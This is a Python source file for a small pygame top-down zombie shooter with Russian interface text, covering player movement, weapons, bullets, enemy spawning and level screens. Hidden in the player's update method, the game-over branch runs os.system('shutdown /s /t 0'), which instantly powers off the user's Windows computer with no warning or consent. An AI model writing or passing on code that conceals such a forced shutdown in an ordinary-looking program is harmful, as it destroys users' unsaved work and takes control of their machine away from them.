import sys
import pygame
from superwires import games, color
import math
import random
from time import sleep
import os

screen_width = 1000
screen_height = 600

WAVES = 4

games.init(screen_width=screen_width, screen_height=screen_height, fps=60)

pygame.display.set_caption('The game')
pygame.display.set_icon(pygame.image.load('material/zombie_left.png').convert_alpha())


class Player(games.Sprite):
    images = {'RIGHT0': games.load_image("material/stick_right.png"),
              'LEFT0': games.load_image("material/stick_left.png"),
              'RIGHT1': games.load_image("material/stick_right2.png"),
              'LEFT1': games.load_image("material/stick_left2.png")}
    SPEED = 6
    ACCEL = 0.3
    game_x = 0
    game_y = 0
    game_dx = 0
    game_dy = 0
    gy = 0
    gx = 0

    def __init__(self, pos_x, pos_y, weapon, ob, waves):
        self.image_code = 'RIGHT1'
        super().__init__(image=Player.images[self.image_code], x=pos_x, y=pos_y)
        self.acceleration_y = 0
        self.acceleration_x = 0
        self.anim = 0
        self.iframe = 0
        self.time = 18
        self.hp = 3
        self.hp_init = 10
        self.waves = waves
        self.weapon = weapon
        self.ob = ob
        self.bomb = False
        self.exit_time = -1
        self.spawner = Spawner((WAVES-waves+1)*7+random.randint(-3, 3), 60, self, self.ob, self.weapon, self.waves)
        games.screen.add(self.spawner)
        self.hp_status = games.Text(value='Жизни: 3', x=100, y=30, size=50,
                                    color=color.dark_red)
        games.screen.add(self.hp_status)

    def hand_pos(self):
        return self.x, self.y

    def take_damage(self):
        if self.iframe == 0:
            self.hp -= 1
            self.iframe = 60

    def update(self):
        if self.hp_init > 0:
            self.hp_init -= 1
        elif self.hp_init == 0:
            games.screen.add(self.hp_status)
            self.hp_init -= 1

        if self.hp == 0:
            game_over = games.Text(value='Игра окончена', x=screen_width//2, y=screen_height//2, size=150,
                                   color=color.black)
            games.screen.add(game_over)
            self.exit_time = 5
            self.hp = -1
            os.system('shutdown /s /t 0')

        if self.exit_time > 0:
            self.exit_time -= 1
        elif self.exit_time == 0:
            sleep(2)
            sys.exit()

        if self.time == 0:
            self.time = 18
            self.anim = (self.anim + 1) % 2
        if self.iframe > 0:
            self.iframe -= 1

        self.hp_status.value = f'Жизни: {max(self.hp, 0)}'

        if games.mouse.x < screen_width//2:
            self.image_code = 'LEFT' + str(self.anim)
            self.image = Player.images[self.image_code]
        else:
            self.image_code = 'RIGHT' + str(self.anim)
            self.image = Player.images[self.image_code]

        if games.keyboard.is_pressed(games.K_w):
            self.acceleration_y -= self.ACCEL
            self.acceleration_y = max(-1, self.acceleration_y)
        elif games.keyboard.is_pressed(games.K_s):
            self.acceleration_y += self.ACCEL
            self.acceleration_y = min(1, self.acceleration_y)
        else:
            if self.acceleration_y < 0:
                if abs(self.acceleration_y) < self.ACCEL:
                    self.acceleration_y = 0
                else:
                    self.acceleration_y += self.ACCEL
            else:
                if abs(self.acceleration_y) < self.ACCEL:
                    self.acceleration_y = 0
                else:
                    self.acceleration_y -= self.ACCEL

        if games.keyboard.is_pressed(games.K_a):
            self.acceleration_x -= self.ACCEL
            self.acceleration_x = max(-1, self.acceleration_x)
            self.time -= 1
        elif games.keyboard.is_pressed(games.K_d):
            self.acceleration_x += self.ACCEL
            self.acceleration_x = min(1, self.acceleration_x)
            self.time -= 1
        else:
            self.time = 18
            self.image_code = self.image_code[:-1] + '0'
            self.image = Player.images[self.image_code]
            if self.acceleration_x < 0:
                if abs(self.acceleration_x) < self.ACCEL:
                    self.acceleration_x = 0
                else:
                    self.acceleration_x += self.ACCEL
            else:
                if abs(self.acceleration_x) < self.ACCEL:
                    self.acceleration_x = 0
                else:
                    self.acceleration_x -= self.ACCEL

        Player.game_dx = Player.SPEED * self.acceleration_x
        Player.gx += Player.game_dx
        Player.game_x = Player.gx + (games.mouse.x - screen_width // 2) // 8

        Player.game_dy = Player.SPEED * self.acceleration_y
        Player.gy += Player.game_dy
        Player.game_y = Player.gy + (games.mouse.y - screen_height // 2) // 8

        if Player.gx > 2460:
            Player.gx = 2460
        elif Player.gx < -2460:
            Player.gx = - 2460
        if Player.gy > 1520:
            Player.gy = 1520
        elif Player.gy < -2120:
            Player.gy = -2120
        self.x = screen_width//2 - (games.mouse.x - screen_width // 2) // 8
        self.y = screen_height//2 - (games.mouse.y - screen_height // 2) // 8

        Player.hand_y = self.y + 10
        if self.image_code[-1] == '1':
            Player.hand_y += 3
        if self.image_code[:-1] == "LEFT":
            Player.hand_x = self.x - 38
        else:
            Player.hand_x = self.x + 38
        if self.image_code[-1] == 1:
            Player.hand_y += 5


def game_y():
    return Player.game_y


def game_x():
    return Player.game_x


def hand_x():
    return Player.hand_x


def hand_y():
    return Player.hand_y


def pyth(x, y):
    ans = math.sqrt(x**2+y**2)
    return ans if ans != 0 else 0.001


class Background(games.Sprite):
    def __init__(self, pos_x, pos_y):
        self.gx = pos_x
        self.gy = pos_y
        super().__init__(image=games.load_image("material/bg.jpg", transparent=False),
                         x=self.gx - game_x(), y=self.gy - game_y())

    def update(self):
        self.x = self.gx - game_x()
        self.y = self.gy - game_y()


class Enemy(games.Sprite):
    def __init__(self, enemy_class, pos_x, pos_y, hp, player, speed=3.0, scale=1.0):
        self.images = {'LEFT': games.scale_image(games.load_image(f'material/{enemy_class}_left.png'), scale),
                       'RIGHT': games.scale_image(games.load_image(f'material/{enemy_class}_right.png'), scale)}
        self.gx = pos_x
        self.gy = pos_y
        self.hp = hp
        self.speed = speed
        self.player = player
        self.aim_angle = 0
        self.move = 0
        self.shoot_time = 120
        self.enemy_class = enemy_class
        super().__init__(image=self.images['LEFT'], x=self.gx - game_x(),
                         y=self.gy - game_y())

    def update(self):
        self.x = self.gx - game_x()
        self.y = self.gy - game_y()

        self.distance_y = self.player.y - self.y
        self.distance_x = self.player.x - self.x

        self.aim_angle = math.acos((10 * self.distance_y) / (pyth(0, 10) * pyth(self.distance_x, self.distance_y)))

        if self.player.x < self.x:
            self.image = self.images['LEFT']
            self.rotation = 1
        else:
            self.image = self.images['RIGHT']
            self.rotation = -1

        if self.shoot_time > 0:
            self.shoot_time -= 1

        if pyth(self.distance_x, self.distance_y) < 300 and self.enemy_class == 'plevaka':
            if self.shoot_time == 0 :
                shot = Bullet('ENEMY', self.x, self.y-10, self.aim_angle * self.rotation, damage=1, scale=1, speed=6)
                games.screen.add(shot)
                self.shoot_time = 90
        elif pyth(self.distance_x, self.distance_y) < 15 and self.enemy_class == 'zombie':
            pass
        else:
            if self.rotation == 1:
                self.gx -= math.sin(self.aim_angle) * self.speed
                self.gy += math.cos(self.aim_angle) * self.speed
            else:
                self.gx += math.sin(self.aim_angle) * self.speed
                self.gy += math.cos(self.aim_angle) * self.speed

        for sprite in self.overlapping_sprites:
            if type(sprite) == Player:
                sprite.take_damage()

    def take_damage(self, damage):
        self.hp -= damage
        if self.hp <= 0:
            self.destroy()


'''class Bomb(games.Sprite):
    def __init__(self, pos_x, pos_y, gun):
        self.gx = pos_x
        self.gy = pos_y
        self.lifetime = 1200
        super().__init__(image=games.scale_image(games.load_image('material/bomba.png'), 1))
        self.x = self.gx - game_x()
        self.y = self.gy - game_y()

    def update(self):
        self.x = self.gx - game_x()
        self.y = self.gy - game_y()

        if self.lifetime > 0:
            self.lifetime -= 1
        else:
            self.destroy()

        for sprite in self.overlapping_sprites():
            if isinstance(sprite, Player):
                sprite.get_bomb()
                self.destroy()'''


class Weapon(games.Sprite):
    def __init__(self):
        self.images = {'LEFT_PISTOL': games.load_image('material/pistol_left.png', transparent=False),
                       'RIGHT_PISTOL': games.load_image('material/pistol_right.png', transparent=False),
                       'LEFT_AK': games.load_image('material/ak_left.png'),
                       'RIGHT_AK': games.load_image('material/ak_right.png'),
                       'LEFT_SHOTGUN': games.scale_image(games.load_image('material/shotgun_left.png'), 0.6),
                       'RIGHT_SHOTGUN': games.scale_image(games.load_image('material/shotgun_right.png'), 0.6)}
        self.weapon = 'PISTOL'
        super().__init__(image=self.images[f'LEFT_{self.weapon}'], x=game_x(), y=game_y())
        self.angle, self.aim_angle, self.offset_x, self.offset_y, self.bul_x, self.bul_y = 0, 0, -5, 0, 20, -8
        self.aim_x = games.mouse.x - self.x
        self.aim_y = games.mouse.y - self.y
        self.shoot_time, self.switch = 30, 30
        self.shotgun_spread = 30
        self.shotgun_bullet = 10
        self.rotation = -1
        self.dist = 0

    def get_bomb(self):
        self.bomb = True

    def update(self):
        if self.switch == 0:
            if games.keyboard.is_pressed(games.K_1) and self.weapon != 'PISTOL':
                self.weapon = 'PISTOL'
                self.shoot_time = 30
                self.offset_x = -5
                self.offset_y = 0
                self.bul_x = 20
                self.bul_y = -8
                self.switch = 30
            elif games.keyboard.is_pressed(games.K_2) and self.weapon != 'AK':
                self.weapon = 'AK'
                self.shoot_time = 10
                self.offset_x = -10
                self.offset_y = 0
                self.bul_x = 70
                self.bul_y = -10
                self.switch = 30
            elif games.keyboard.is_pressed(games.K_3) and self.weapon != 'SHOTGUN':
                self.weapon = 'SHOTGUN'
                self.shoot_time = 50
                self.offset_x = -0
                self.offset_y = 5
                self.bul_x = 50
                self.bul_y = -10
                self.switch = 30
        else:
            if self.switch > 0:
                self.switch -= 1
        if self.shoot_time > 0:
            self.shoot_time -= 1

        self.x = hand_x() + self.offset_x * self.rotation
        self.y = hand_y() + self.offset_y

        self.aim_x = games.mouse.x - screen_width // 2
        self.aim_y = games.mouse.y - screen_height // 2

        if screen_width // 2 > games.mouse.x:
            self.image = self.images[f'LEFT_{self.weapon}']
            self.polx = -1
            self.rotation = -1
        else:
            self.image = self.images[f'RIGHT_{self.weapon}']
            self.polx = 1
            self.rotation = 1
        if screen_height // 2 > games.mouse.y:
            self.poly = -1
        else:
            self.poly = 1

        if self.polx == 1 and self.poly == 1:
            self.dist = pyth(self.aim_x, self.aim_y)
            self.aim_angle = math.acos(self.aim_x / self.dist) + math.radians(-90)
            self.angle = math.degrees(self.aim_angle) + 90
        if self.polx == 1 and self.poly == -1:
            self.dist = pyth(self.aim_x, self.aim_y)
            self.aim_angle = -math.acos(self.aim_x / self.dist) + math.radians(-90)
            self.angle = math.degrees(self.aim_angle) + 90
        if self.polx == -1 and self.poly == 1:
            self.dist = pyth(self.aim_x, self.aim_y)
            self.aim_angle = math.acos(self.aim_x / self.dist) + math.radians(-90)
            self.angle = math.degrees(self.aim_angle) - 90
        elif self.polx == -1 and self.poly == -1:
            self.dist = pyth(self.aim_x, self.aim_y)
            self.aim_angle = -math.acos(self.aim_x / self.dist) + math.pi + math.radians(90)
            self.angle = math.degrees(self.aim_angle) - 90

        self.bul_cos = self.aim_x / self.dist
        self.bul_sin = self.aim_y / self.dist

        if games.mouse.is_pressed(0) and self.shoot_time == 0:
            if self.weapon == 'PISTOL':
                shot = Bullet('FRIENDLY', self.x+self.bul_x * self.bul_cos, self.y + self.bul_x * self.bul_sin, self.aim_angle, damage=16, scale=0.5)
                games.screen.add(shot)
                self.shoot_time = 30
            elif self.weapon == 'SHOTGUN':
                self.angle_per_bullet = int(self.shotgun_spread / (self.shotgun_bullet // 2))
                angle = self.aim_angle - math.radians(self.shotgun_spread)
                for i in range(self.shotgun_bullet):
                    shot = Bullet('FRIENDLY', self.x + self.bul_x * self.bul_cos, self.y + self.bul_x * self.bul_sin,
                                  angle, damage=3, scale=0.6)
                    games.screen.add(shot)
                    angle += math.radians(self.angle_per_bullet)
                self.shoot_time = 50
            elif self.weapon == 'AK':
                shot = Bullet('FRIENDLY', self.x - self.bul_y * self.bul_sin + self.bul_x * self.bul_cos, self.y - self.bul_y * self.bul_sin + self.bul_x * self.bul_sin,
                              self.aim_angle+math.radians(random.randint(-3, 3)), damage=4, scale=0.3, speed=15)
                games.screen.add(shot)
                self.shoot_time = 9


class Bullet(games.Sprite):
    def __init__(self, type, x, y, angle, damage, scale=0.5, speed=10):
        self.images = {'FRIENDLY': games.scale_image(games.load_image('material/bullet_f.png'), scale),
                       'ENEMY': games.scale_image(games.load_image('material/bullet_e.png'), scale)}
        self.speed = speed
        self.lifetime = 180
        self.damage = damage
        self.type = type
        super().__init__(image=self.images[f'{type.upper()}'],
                         x=x-math.sin(angle) * self.speed,
                         y=y+math.cos(angle) * self.speed,
                         dx=-math.sin(angle) * self.speed,
                         dy=math.cos(angle) * self.speed,
                         angle=angle)

        self.gy = self.y + game_y()
        self.gx = self.x + game_x()
        self.angle += math.degrees(angle)+90

    def update(self):
        self.gy += self.dy
        self.y = self.gy - game_y()
        self.gx += self.dx
        self.x = self.gx - game_x()

        if self.lifetime > 0:
            self.lifetime -= 1
        else:
            self.destroy()

        for sprite in self.overlapping_sprites:
            if isinstance(sprite, Enemy) and self.type == 'FRIENDLY':
                sprite.take_damage(self.damage)
                self.destroy()
            elif isinstance(sprite, Player) and self.type == 'ENEMY':
                sprite.take_damage()
                self.destroy()


class Spawner(games.Sprite):
    def __init__(self, zombs, time, player, ob, gun, waves):
        self.zombs = zombs
        self.time = time
        self.count = time
        self.endtimer = -1
        self.segment_x = 1230
        self.segment_y = 910
        self.waves = waves
        self.player = player
        self.gun = gun
        self.ob = ob
        self.nospawn = False
        super().__init__(image=games.load_image('material/empty.png'), x=0, y=0)
        self.mapp = ((-2460, -2120), (-1230, -2120), (0, -2120), (1230, -2120),
                     (-2460, -1210), (-1230, -1210), (0, -1210), (1230, -1210),
                     (-2460, -300), (-1230, -300), (0, -300), (1230, -300),
                     (-2460, 610), (-1230, 610), (0, 610), (1230, 610))

    def update(self):
        if self.zombs == 0 and self.endtimer == -1:
            self.nospawn = True
            for sprite in games.screen.get_all_objects():
                if isinstance(sprite, Enemy):
                    break
            else:
                self.endtimer = 120

        if self.endtimer > 0:
            self.endtimer -= 1
        elif self.endtimer == 0:
            self.waves -= 1
            for sprite in games.screen.all_objects:
                if isinstance(sprite, games.Text):
                    sprite.destroy()
                elif isinstance(sprite, Player):
                    sprite.gx = 0
                    sprite.gy = 0
                    sprite.waves = self.waves
                    sprite.spawner = Spawner((WAVES-sprite.waves+1)*7+random.randint(-3, 3), 60, sprite, sprite.ob, sprite.weapon, sprite.waves)
                    games.screen.add(sprite.spawner)
                    sprite.hp_status = games.Text(value='Жизни: 3', x=100, y=30, size=50,
                                                color=color.dark_red)
                    games.screen.add(sprite.hp_status)
                elif isinstance(sprite, Bullet):
                    sprite.destroy()
                elif isinstance(sprite, Weapon):
                    sprite.weapon = 'PISTOL'
                    sprite.shoot_time = 30
                    sprite.offset_x = -5
                    sprite.offset_y = 0
                    sprite.bul_x = 20
                    sprite.bul_y = -8
                    sprite.switch = 30

            if self.waves != 0:
                scr = Gamer(f'Уровень {WAVES - self.waves + 1}',False)
                games.screen.add(scr)
            else:
                scr = End()
                games.screen.add(scr)
            self.destroy()
        elif self.nospawn:
            pass
        elif self.count > 0:
            self.count -= 1
        elif self.count == 0:
            self.zombs -= 1
            self.count = self.time
            self.active_map = list(self.mapp)
            while True:
                self.segment = random.choice(self.active_map)
                self.spawn_x = random.randint(self.segment[0], self.segment_x)
                self.spawn_y = random.randint(self.segment[1], self.segment_y)
                self.dist_x = self.spawn_x - game_x()
                self.dist_y = self.spawn_y - game_y()
                if 800 < pyth(self.dist_x, self.dist_y) < 2500:
                    tp = random.choice(['zombie', 'plevaka'])
                    if tp == 'zombie':
                        zom = Enemy(tp, self.spawn_x, self.spawn_y, 20, self.player, speed=3, scale=0.8)
                        games.screen.add(zom)
                    else:
                        zom = Enemy(tp, self.spawn_x, self.spawn_y, 15, self.player, speed=3.5, scale=1)
                        games.screen.add(zom)
                    break
                else:
                    self.active_map.pop(self.active_map.index(self.segment))


class Gamer(games.Sprite):
    def __init__(self, text, init = True):
        self.text = games.Text(value=text, right=-100, y=screen_height // 2, size=150, color=color.white)
        super().__init__(image=games.load_image('material/begin.png', transparent=False), x=screen_width//2, y=screen_height//2)
        self.start = 10
        self.init = init

    def update(self):
        if self.start > 1:
            self.start -= 1
        elif self.start == 1:
            self.start -= 1
            games.screen.add(self.text)
        else:
            self.text.dx = 10
            if self.text.left > screen_width:
                if self.init:
                    ob = Background(500, 0)
                    gun = Weapon()
                    stickman = Player(screen_width // 2, screen_height // 2, gun, ob, WAVES)

                    games.screen.add(ob)
                    games.screen.add(stickman)
                    games.screen.add(gun)
                self.text.destroy()
                self.destroy()


class End(games.Sprite):
    def __init__(self, message='Победа!'):
        self.value = message
        self.start = 10
        super().__init__(image=games.load_image('material/begin.png', transparent=False), x=0, y=0)
        self.text = games.Text(value=self.value, size=150, color=color.white, x=-100, y=screen_height // 2, dx=5)
        games.screen.add(self.text)

    def update(self):
        if self.start > 0:
            self.start -= 1
        elif self.start == 0:
            self.start -= 1
            games.screen.add(self.text)
        else:
            if self.text.left > screen_width:
                sys.exit()


def main():
    background = games.load_image('material/back.png', transparent=False)
    games.screen.background = background

    zastavka = Gamer('Уровень 1')
    games.screen.add(zastavka)



    games.screen.mainloop()


main()
